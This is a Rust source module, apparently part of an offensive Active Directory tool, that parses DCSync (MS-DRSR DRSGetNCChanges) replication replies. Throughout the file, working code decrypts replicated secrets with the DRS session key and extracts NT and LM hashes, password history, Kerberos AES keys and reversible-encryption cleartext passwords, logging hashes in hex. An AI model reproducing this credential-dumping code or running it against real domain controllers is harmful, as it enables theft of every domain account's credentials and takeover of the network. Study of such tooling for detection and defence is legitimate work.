//! MS-DRSR (Directory Replication Service Remote) Response Parser
//!
//! Parses DRSGetNCChanges (opnum 3) responses to extract replicated
//! Active Directory attributes — specifically credential material:
//! - unicodePwd (NTLM hash)
//! - supplementalCredentials (Kerberos keys, cleartext passwords)
//! - sAMAccountName (for mapping hashes to users)
//!
//! The replicated attributes are encrypted with the DRS session key
//! established during DRSBind (opnum 0).
//!
//! Reference: [MS-DRSR] <https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr>

use crate::error::{OverthroneError, Result};
use md5::{Digest as Md5Digest, Md5};
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
// Constants — Well-known ATTID values
// ═══════════════════════════════════════════════════════════

/// ATTID for sAMAccountName (1.2.840.113556.1.4.221)
const ATTID_SAM_ACCOUNT_NAME: u32 = 0x000904D8;
/// ATTID for unicodePwd (1.2.840.113556.1.4.90)
const ATTID_UNICODE_PWD: u32 = 0x0009005A;
/// ATTID for supplementalCredentials (1.2.840.113556.1.4.125)
const ATTID_SUPPLEMENTAL_CREDENTIALS: u32 = 0x0009007D;
/// ATTID for ntPwdHistory (1.2.840.113556.1.4.94)
const ATTID_NT_PWD_HISTORY: u32 = 0x0009005E;
/// ATTID for lmPwdHistory (1.2.840.113556.1.4.160)
const ATTID_LM_PWD_HISTORY: u32 = 0x000900A0;
/// ATTID for objectSid (1.2.840.113556.1.4.146)
const ATTID_OBJECT_SID: u32 = 0x00090092;
/// ATTID for userAccountControl (1.2.840.113556.1.4.8)
const ATTID_USER_ACCOUNT_CONTROL: u32 = 0x00090008;
/// ATTID for distinguishedName
const ATTID_DN: u32 = 0x00090001;

/// Encryption type markers in the replicated blob
const DRS_ENC_TYPE_RC4: u32 = 1;
const DRS_ENC_TYPE_AES: u32 = 2;

// ═══════════════════════════════════════════════════════════
// Public Types
// ═══════════════════════════════════════════════════════════

/// A replicated AD object with its credential attributes
#[derive(Debug, Clone)]
pub struct ReplicatedObject {
    /// Distinguished Name
    pub dn: String,
    /// sAMAccountName
    pub sam_account_name: String,
    /// objectSid as string (S-1-5-21-...)
    pub object_sid: Option<String>,
    /// RID extracted from SID
    pub rid: Option<u32>,
    /// userAccountControl flags
    pub uac: Option<u32>,
    /// Decrypted unicodePwd (NT hash, 16 bytes)
    pub nt_hash: Option<Vec<u8>>,
    /// Decrypted LM hash (16 bytes, usually empty)
    pub lm_hash: Option<Vec<u8>>,
    /// Supplemental credentials (Kerberos keys, etc.)
    pub supplemental_credentials: Option<SupplementalCredentials>,
}

/// Parsed supplementalCredentials structure
#[derive(Debug, Clone)]
pub struct SupplementalCredentials {
    /// Kerberos AES-256 key
    pub aes256_key: Option<Vec<u8>>,
    /// Kerberos AES-128 key
    pub aes128_key: Option<Vec<u8>>,
    /// Cleartext password (if reversible encryption enabled)
    pub cleartext: Option<String>,
}

/// Result of parsing a DRSGetNCChanges response
#[derive(Debug, Clone)]
pub struct DcSyncResult {
    /// All replicated objects with credentials
    pub objects: Vec<ReplicatedObject>,
    /// Whether there's more data to fetch
    pub more_data: bool,
    /// Total objects in the response
    pub total_objects: u32,
}

// ═══════════════════════════════════════════════════════════
// Main Parser
// ═══════════════════════════════════════════════════════════

/// Parse a DRSGetNCChanges (opnum 3) RPC response and extract credentials.
///
/// # Arguments
/// * `response`    — Raw RPC response bytes (including PDU header)
/// * `session_key` — DRS session key from DRSBind (used to decrypt attributes)
///
/// # Returns
/// Parsed objects with decrypted NT hashes and supplemental credentials.
pub fn parse_get_nc_changes_reply(response: &[u8], session_key: &[u8]) -> Result<DcSyncResult> {
    // Skip RPC PDU header (24 bytes for request PDU)
    if response.len() < 28 {
        return Err(OverthroneError::custom(
            "DRSGetNCChanges response too short",
        ));
    }

    let stub_data = &response[24..];

    // First 4 bytes: dwOutVersion
    if stub_data.len() < 4 {
        return Err(OverthroneError::custom("No stub data in response"));
    }

    let out_version = read_u32(stub_data, 0);
    debug!("DRS reply version: {}", out_version);

    // Parse based on version (v1 and v6 have similar structures for our purposes)
    match out_version {
        1 | 2 | 6 | 7 => parse_reply_v6(stub_data, session_key, out_version),
        _ => {
            warn!(
                "Unexpected DRS reply version: {}, attempting v6 parse",
                out_version
            );
            parse_reply_v6(stub_data, session_key, out_version)
        }
    }
}

/// Parse DRS_MSG_GETCHGREPLY_V6 (also handles V1/V2/V7 with offset adjustments).
///
/// DRS_MSG_GETCHGREPLY_V6 fixed inline header layout (offsets within stub_data,
/// which starts *after* the 24-byte DCE/RPC PDU header):
///
///  [0..4]    dwOutVersion
///  [4..8]    pNC                  (pointer referent ID)
///  [8..24]   uuidDsaObjSrc        (16 bytes)
///  [24..40]  uuidInvocIdSrc       (16 bytes)
///  [40..44]  pUpToDateVecSrc      (pointer)
///  [44..48]  PrefixTableSrc.PrefixCount
///  [48..52]  PrefixTableSrc.pPrefixEntry (pointer)
///  [52..76]  usnvecFrom           (24 bytes)
///  [76..100] usnvecTo             (24 bytes)
///  [100..104] pUpToDateVecDst     (pointer)
///  [104..108] ulExtendedRet
///  [108..112] cNumObjects         ← key count
///  [112..116] cNumBytes
///  [116..120] pObjects            (pointer, non-null when objects present)
///  [120..124] fMoreData
///  [124..128] cNumNcSizeObjects
///  [128..136] cNumNcSizeData      (u64)
///  [136..140] dwDRSError
///  = 140 bytes total fixed inline header
///
/// All deferred (pointer-referent) data follows after offset 140.
fn parse_reply_v6(stub_data: &[u8], session_key: &[u8], _version: u32) -> Result<DcSyncResult> {
    const CNUMOBJECTS_OFF: usize = 108;
    const POBJ_REF_OFF:    usize = 116;
    const FMOREDATA_OFF:   usize = 120;
    const FIXED_HDR:       usize = 140;

    if stub_data.len() < FIXED_HDR {
        return Err(OverthroneError::custom(
            "DRS reply stub too short for fixed v6 header",
        ));
    }

    let c_num_objects = read_u32(stub_data, CNUMOBJECTS_OFF) as usize;
    let p_obj_ref     = read_u32(stub_data, POBJ_REF_OFF);
    let f_more_data   = read_u32(stub_data, FMOREDATA_OFF) != 0;

    debug!(
        "DRS header: cNumObjects={}, pObjects_ref=0x{:08x}, fMoreData={}",
        c_num_objects, p_obj_ref, f_more_data
    );

    // If no objects or null pointer — return empty result
    if c_num_objects == 0 || p_obj_ref == 0 {
        return Ok(DcSyncResult {
            objects: Vec::new(),
            more_data: f_more_data,
            total_objects: 0,
        });
    }

    // Clamp to a sane upper bound to handle corrupt/unexpected responses
    let target_count = c_num_objects.min(50_000);

    let objects = scan_for_replentinflist(stub_data, FIXED_HDR, target_count, session_key)?;

    info!(
        "DCSync: parsed {} of {} expected object(s), more_data={}",
        objects.len(), target_count, f_more_data
    );

    let n = objects.len() as u32;
    Ok(DcSyncResult {
        objects,
        more_data: f_more_data,
        total_objects: n,
    })
}

/// Scan the NDR response for REPLENTINFLIST entries.
///
/// Starts at `start_offset` (after the fixed inline header) and walks forward
/// looking for NDR-encoded ENTINF attribute-block patterns.  Stops after
/// `target_count` valid objects are found or the buffer is exhausted.
fn scan_for_replentinflist(
    data: &[u8],
    start_offset: usize,
    target_count: usize,
    session_key: &[u8],
) -> Result<Vec<ReplicatedObject>> {
    let mut objects = Vec::new();
    let data_len = data.len();
    let mut scan_pos = start_offset.min(data_len);

    while scan_pos + 12 < data_len && objects.len() < target_count {
        let maybe_attid = read_u32(data, scan_pos);

        if is_known_attid(maybe_attid) {
            // Found a recognisable ATTID — search backwards for the
            // ENTINF.AttrBlock boundary (attrCount).
            if let Some(obj_start) = find_object_start(data, scan_pos) {
                match parse_replicated_object(data, obj_start, session_key) {
                    Ok((obj, next_pos)) if next_pos > scan_pos => {
                        if !obj.sam_account_name.is_empty() || obj.nt_hash.is_some() {
                            objects.push(obj);
                        }
                        scan_pos = next_pos;
                        continue;
                    }
                    _ => {}
                }
            }
        }

        scan_pos += 4;
    }

    Ok(objects)
}

/// Check if a u32 value is a known ATTID
fn is_known_attid(val: u32) -> bool {
    matches!(
        val,
        ATTID_SAM_ACCOUNT_NAME
            | ATTID_UNICODE_PWD
            | ATTID_SUPPLEMENTAL_CREDENTIALS
            | ATTID_NT_PWD_HISTORY
            | ATTID_LM_PWD_HISTORY
            | ATTID_OBJECT_SID
            | ATTID_USER_ACCOUNT_CONTROL
            | ATTID_DN
    )
}

/// Search backwards from an ATTID to find the start of the object (ENTINF boundary)
fn find_object_start(data: &[u8], attid_pos: usize) -> Option<usize> {
    let search_start = attid_pos.saturating_sub(64);
    let mut pos = attid_pos.saturating_sub(8);

    while pos >= search_start && pos >= 8 {
        let maybe_count = read_u32(data, pos);
        let maybe_flags = read_u32(data, pos.saturating_sub(4));

        if (1..=50).contains(&maybe_count) && maybe_flags == 0 {
            let first_attid_pos = pos + 4;
            if first_attid_pos + 4 <= data.len() {
                let first_attid = read_u32(data, first_attid_pos);
                if is_known_attid(first_attid) || (first_attid & 0xFFFF0000) == 0x00090000 {
                    return Some(pos);
                }
            }
        }
        if pos < search_start + 4 {
            break;
        }
        pos -= 4;
    }

    Some(attid_pos.saturating_sub(4))
}

/// Parse a single replicated object's attributes from the NDR stream
fn parse_replicated_object(
    data: &[u8],
    start: usize,
    session_key: &[u8],
) -> Result<(ReplicatedObject, usize)> {
    let mut obj = ReplicatedObject {
        dn: String::new(),
        sam_account_name: String::new(),
        object_sid: None,
        rid: None,
        uac: None,
        nt_hash: None,
        lm_hash: None,
        supplemental_credentials: None,
    };

    if start + 4 > data.len() {
        return Err(OverthroneError::custom("Object start out of bounds"));
    }

    let attr_count = read_u32(data, start) as usize;
    if attr_count > 100 || attr_count == 0 {
        return Err(OverthroneError::custom("Invalid attr count"));
    }

    let mut pos = start + 4;

    for _ in 0..attr_count {
        if pos + 12 > data.len() {
            break;
        }

        let attr_typ = read_u32(data, pos);
        let val_count = read_u32(data, pos + 4);
        let _p_aval = read_u32(data, pos + 8);
        pos += 12;

        if val_count > 0 && val_count < 100 {
            for _ in 0..val_count {
                if pos + 8 > data.len() {
                    break;
                }

                let val_len = read_u32(data, pos) as usize;
                let _val_ptr = read_u32(data, pos + 4);
                pos += 8;

                if pos + val_len > data.len() || val_len > 65536 {
                    continue;
                }

                let value_data = &data[pos..pos + val_len];
                pos += val_len;
                // Align to 4 bytes
                pos = (pos + 3) & !3;

                process_attribute(&mut obj, attr_typ, value_data, session_key);
            }
        }
    }

    Ok((obj, pos))
}

/// Process a single replicated attribute value
fn process_attribute(
    obj: &mut ReplicatedObject,
    attr_typ: u32,
    value_data: &[u8],
    session_key: &[u8],
) {
    let normalized = normalize_attid(attr_typ);

    match normalized {
        ATTID_SAM_ACCOUNT_NAME => {
            obj.sam_account_name = utf16le_to_string(value_data);
            debug!("  sAMAccountName: {}", obj.sam_account_name);
        }
        ATTID_OBJECT_SID => {
            obj.object_sid = Some(sid_to_string(value_data));
            obj.rid = extract_rid(value_data);
            debug!("  objectSid: {:?} (RID: {:?})", obj.object_sid, obj.rid);
        }
        ATTID_USER_ACCOUNT_CONTROL => {
            if value_data.len() >= 4 {
                obj.uac = Some(read_u32(value_data, 0));
            }
        }
        ATTID_UNICODE_PWD => match decrypt_replicated_secret(value_data, session_key) {
            Ok(decrypted) => {
                if decrypted.len() >= 16 {
                    obj.nt_hash = Some(decrypted[..16].to_vec());
                    debug!("  unicodePwd decrypted: {}", hex_encode(&decrypted[..16]));
                }
            }
            Err(e) => warn!("  Failed to decrypt unicodePwd: {}", e),
        },
        ATTID_NT_PWD_HISTORY => {
            if let Ok(decrypted) = decrypt_replicated_secret(value_data, session_key)
                && decrypted.len() >= 16
                && obj.nt_hash.is_none()
            {
                obj.nt_hash = Some(decrypted[..16].to_vec());
            }
        }
        ATTID_LM_PWD_HISTORY => {
            if let Ok(decrypted) = decrypt_replicated_secret(value_data, session_key)
                && decrypted.len() >= 16
            {
                obj.lm_hash = Some(decrypted[..16].to_vec());
            }
        }
        ATTID_SUPPLEMENTAL_CREDENTIALS => {
            if let Ok(decrypted) = decrypt_replicated_secret(value_data, session_key) {
                obj.supplemental_credentials = parse_supplemental_credentials(&decrypted);
            }
        }
        _ => {
            // Unknown or uninteresting attribute — skip
        }
    }
}

/// Normalize an ATTID to its well-known form.
fn normalize_attid(attid: u32) -> u32 {
    if is_known_attid(attid) {
        return attid;
    }

    let prefix = attid & 0xFFFF0000;
    let suffix = attid & 0x0000FFFF;

    if prefix == 0x00090000 {
        return attid;
    }

    match suffix {
        0x005A => ATTID_UNICODE_PWD,
        0x005E => ATTID_NT_PWD_HISTORY,
        0x00A0 => ATTID_LM_PWD_HISTORY,
        0x007D => ATTID_SUPPLEMENTAL_CREDENTIALS,
        0x04D8 => ATTID_SAM_ACCOUNT_NAME,
        0x0092 => ATTID_OBJECT_SID,
        0x0008 => ATTID_USER_ACCOUNT_CONTROL,
        _ => attid,
    }
}

// ═══════════════════════════════════════════════════════════
// Credential Decryption
// ═══════════════════════════════════════════════════════════

/// Decrypt a replicated secret (unicodePwd, supplementalCredentials, etc.)
fn decrypt_replicated_secret(enc_data: &[u8], session_key: &[u8]) -> Result<Vec<u8>> {
    if enc_data.len() < 28 {
        return Err(OverthroneError::custom("Encrypted attribute too short"));
    }

    let version = read_u32(enc_data, 0);

    if version == 1 || version == 2 {
        let enc_type = version;
        let salt = &enc_data[4..20];
        let payload = &enc_data[20..];

        match enc_type {
            DRS_ENC_TYPE_RC4 => decrypt_rc4_drs(session_key, salt, payload),
            DRS_ENC_TYPE_AES => decrypt_aes_drs(session_key, salt, payload),
            _ => Err(OverthroneError::custom(format!(
                "Unknown DRS enc type: {}",
                enc_type
            ))),
        }
    } else {
        let salt = &enc_data[0..16];
        let payload = &enc_data[16..];
        decrypt_rc4_drs(session_key, salt, payload)
    }
}

/// RC4 decryption for DRS replicated attributes
fn decrypt_rc4_drs(session_key: &[u8], salt: &[u8], data: &[u8]) -> Result<Vec<u8>> {
    let rc4_key = {
        let mut md5 = Md5::new();
        md5.update(session_key);
        md5.update(salt);
        md5.finalize().to_vec()
    };

    Ok(rc4_crypt(&rc4_key, data))
}

/// AES-256-CBC decryption for DRS replicated attributes
fn decrypt_aes_drs(session_key: &[u8], iv: &[u8], data: &[u8]) -> Result<Vec<u8>> {
    use aes::cipher::{BlockDecryptMut, KeyIvInit};
    type Aes256CbcDec = cbc::Decryptor<aes::Aes256>;

    let mut key32 = [0u8; 32];
    let copy_len = session_key.len().min(32);
    key32[..copy_len].copy_from_slice(&session_key[..copy_len]);

    let mut iv16 = [0u8; 16];
    let iv_len = iv.len().min(16);
    iv16[..iv_len].copy_from_slice(&iv[..iv_len]);

    let mut buf = data.to_vec();
    // Pad to AES block size
    while !buf.len().is_multiple_of(16) {
        buf.push(0);
    }

    let decryptor = Aes256CbcDec::new((&key32).into(), (&iv16).into());
    let decrypted = decryptor
        .decrypt_padded_mut::<aes::cipher::block_padding::NoPadding>(&mut buf)
        .map_err(|e| OverthroneError::custom(format!("AES DRS decrypt: {e}")))?;

    Ok(decrypted.to_vec())
}

/// RC4 encrypt/decrypt (symmetric)
fn rc4_crypt(key: &[u8], data: &[u8]) -> Vec<u8> {
    let mut s: Vec<u8> = (0..=255u8).collect();
    let mut j: usize = 0;

    for i in 0..256 {
        j = (j + s[i] as usize + key[i % key.len()] as usize) % 256;
        s.swap(i, j);
    }

    let mut i: usize = 0;
    j = 0;
    data.iter()
        .map(|byte| {
            i = (i + 1) % 256;
            j = (j + s[i] as usize) % 256;
            s.swap(i, j);
            byte ^ s[(s[i] as usize + s[j] as usize) % 256]
        })
        .collect()
}

// ═══════════════════════════════════════════════════════════
// Supplemental Credentials Parser
// ═══════════════════════════════════════════════════════════

fn parse_supplemental_credentials(data: &[u8]) -> Option<SupplementalCredentials> {
    if data.len() < 24 {
        return None;
    }

    let mut offset = 0;
    let mut found = false;

    for i in (0..data.len().saturating_sub(4)).step_by(2) {
        if i + 2 <= data.len() {
            let sig = u16::from_le_bytes([data[i], data[i + 1]]);
            if sig == 0x0050 {
                offset = i;
                found = true;
                break;
            }
        }
    }

    if !found {
        return None;
    }

    let prop_count = if offset + 4 <= data.len() {
        u16::from_le_bytes([data[offset + 2], data[offset + 3]]) as usize
    } else {
        return None;
    };

    let mut pos = offset + 4;
    let mut result = SupplementalCredentials {
        aes256_key: None,
        aes128_key: None,
        cleartext: None,
    };

    for _ in 0..prop_count {
        if pos + 6 > data.len() {
            break;
        }

        let name_len = u16::from_le_bytes([data[pos], data[pos + 1]]) as usize;
        let value_len = u16::from_le_bytes([data[pos + 2], data[pos + 3]]) as usize;
        let _reserved = u16::from_le_bytes([data[pos + 4], data[pos + 5]]);
        pos += 6;

        if pos + name_len + value_len > data.len() {
            break;
        }

        let name = utf16le_to_string(&data[pos..pos + name_len]);
        let value_data = &data[pos + name_len..pos + name_len + value_len];
        pos += name_len + value_len;

        match name.as_str() {
            "Primary:Kerberos-Newer-Keys" | "Primary:Kerberos" => {
                let hex_str = utf16le_to_string(value_data);
                if let Some(key_data) = hex_decode_optional(&hex_str) {
                    parse_kerberos_keys(&key_data, &mut result);
                }
            }
            "Primary:CLEARTEXT" => {
                let hex_str = utf16le_to_string(value_data);
                if let Some(cleartext_bytes) = hex_decode_optional(&hex_str) {
                    result.cleartext = Some(utf16le_to_string(&cleartext_bytes));
                }
            }
            _ => {
                debug!("  Supplemental property: {} ({} bytes)", name, value_len);
            }
        }
    }

    Some(result)
}

/// Parse Kerberos keys from the supplemental credential property value
fn parse_kerberos_keys(data: &[u8], result: &mut SupplementalCredentials) {
    if data.len() < 16 {
        return;
    }

    let revision = u16::from_le_bytes([data[0], data[1]]);
    let cred_count = u16::from_le_bytes([data[4], data[5]]) as usize;

    let key_entry_size = if revision >= 3 { 24 } else { 20 };
    let entries_offset: usize = if revision >= 3 { 24 } else { 16 };

    for i in 0..cred_count {
        let entry_pos = entries_offset + i * key_entry_size;
        if entry_pos + key_entry_size > data.len() {
            break;
        }

        let key_type_offset = if revision >= 3 {
            entry_pos + 8
        } else {
            entry_pos + 4
        };
        if key_type_offset + 12 > data.len() {
            break;
        }

        let key_type = u32::from_le_bytes([
            data[key_type_offset],
            data[key_type_offset + 1],
            data[key_type_offset + 2],
            data[key_type_offset + 3],
        ]);
        let key_length = u32::from_le_bytes([
            data[key_type_offset + 4],
            data[key_type_offset + 5],
            data[key_type_offset + 6],
            data[key_type_offset + 7],
        ]) as usize;
        let key_offset = u32::from_le_bytes([
            data[key_type_offset + 8],
            data[key_type_offset + 9],
            data[key_type_offset + 10],
            data[key_type_offset + 11],
        ]) as usize;

        if key_offset + key_length <= data.len() {
            let key_data = data[key_offset..key_offset + key_length].to_vec();
            match key_type {
                18 => {
                    debug!("  Kerberos AES-256 key: {} bytes", key_length);
                    result.aes256_key = Some(key_data);
                }
                17 => {
                    debug!("  Kerberos AES-128 key: {} bytes", key_length);
                    result.aes128_key = Some(key_data);
                }
                23 => {
                    debug!("  Kerberos RC4 key (NT hash): {} bytes", key_length);
                }
                _ => {
                    debug!("  Kerberos key type {}: {} bytes", key_type, key_length);
                }
            }
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Utility Helpers
// ═══════════════════════════════════════════════════════════

#[inline]
fn read_u32(data: &[u8], offset: usize) -> u32 {
    if offset + 4 > data.len() {
        return 0;
    }
    u32::from_le_bytes([
        data[offset],
        data[offset + 1],
        data[offset + 2],
        data[offset + 3],
    ])
}

/// Convert a binary SID to string format (S-1-5-21-...)
fn sid_to_string(data: &[u8]) -> String {
    if data.len() < 8 {
        return String::from("S-0-0");
    }

    let revision = data[0];
    let sub_auth_count = data[1] as usize;
    let authority =
        u64::from_be_bytes([0, 0, data[2], data[3], data[4], data[5], data[6], data[7]]);

    let mut sid = format!("S-{}-{}", revision, authority);

    for i in 0..sub_auth_count {
        let offset = 8 + i * 4;
        if offset + 4 > data.len() {
            break;
        }
        let sub_auth = u32::from_le_bytes([
            data[offset],
            data[offset + 1],
            data[offset + 2],
            data[offset + 3],
        ]);
        sid.push_str(&format!("-{}", sub_auth));
    }

    sid
}

/// Extract RID (last sub-authority) from a binary SID
fn extract_rid(data: &[u8]) -> Option<u32> {
    if data.len() < 12 {
        return None;
    }
    let sub_auth_count = data[1] as usize;
    if sub_auth_count == 0 {
        return None;
    }
    let rid_offset = 8 + (sub_auth_count - 1) * 4;
    if rid_offset + 4 > data.len() {
        return None;
    }
    Some(u32::from_le_bytes([
        data[rid_offset],
        data[rid_offset + 1],
        data[rid_offset + 2],
        data[rid_offset + 3],
    ]))
}

fn utf16le_to_string(bytes: &[u8]) -> String {
    let u16s: Vec<u16> = bytes
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();
    String::from_utf16_lossy(&u16s)
        .trim_end_matches('\0')
        .to_string()
}

fn hex_encode(data: &[u8]) -> String {
    data.iter().map(|b| format!("{:02x}", b)).collect()
}

fn hex_decode_optional(hex: &str) -> Option<Vec<u8>> {
    let hex = hex.trim();
    if !hex.len().is_multiple_of(2) {
        return None;
    }
    let bytes: Vec<u8> = (0..hex.len())
        .step_by(2)
        .filter_map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
        .collect();
    if bytes.len() == hex.len() / 2 {
        Some(bytes)
    } else {
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sid_to_string() {
        // S-1-5-21-0-0-0-500 (4 sub-authorities)
        let sid_bytes = [
            0x01, // revision
            0x04, // sub-authority count = 4
            0x00, 0x00, 0x00, 0x00, 0x00, 0x05, // authority = 5
            0x15, 0x00, 0x00, 0x00, // sub-auth 1 = 21
            0x00, 0x00, 0x00, 0x00, // sub-auth 2 = 0
            0x00, 0x00, 0x00, 0x00, // sub-auth 3 = 0
            0xF4, 0x01, 0x00, 0x00, // sub-auth 4 = 500
        ];
        assert_eq!(sid_to_string(&sid_bytes), "S-1-5-21-0-0-500");
    }

    #[test]
    fn test_extract_rid() {
        let sid_bytes = [
            0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF4, 0x01, 0x00, 0x00,
        ];
        assert_eq!(extract_rid(&sid_bytes), Some(500));
    }

    #[test]
    fn test_rc4_crypt_roundtrip() {
        let key = b"testkey1234";
        let plaintext = b"Hello, World!";
        let encrypted = rc4_crypt(key, plaintext);
        let decrypted = rc4_crypt(key, &encrypted);
        assert_eq!(decrypted, plaintext);
    }

    #[test]
    fn test_normalize_known_attids() {
        assert_eq!(
            normalize_attid(ATTID_SAM_ACCOUNT_NAME),
            ATTID_SAM_ACCOUNT_NAME
        );
        assert_eq!(normalize_attid(ATTID_UNICODE_PWD), ATTID_UNICODE_PWD);
    }

    #[test]
    fn test_normalize_custom_prefix() {
        // A DC using prefix 0x0001 instead of 0x0009 for unicodePwd
        assert_eq!(normalize_attid(0x0001005A), ATTID_UNICODE_PWD);
    }
}
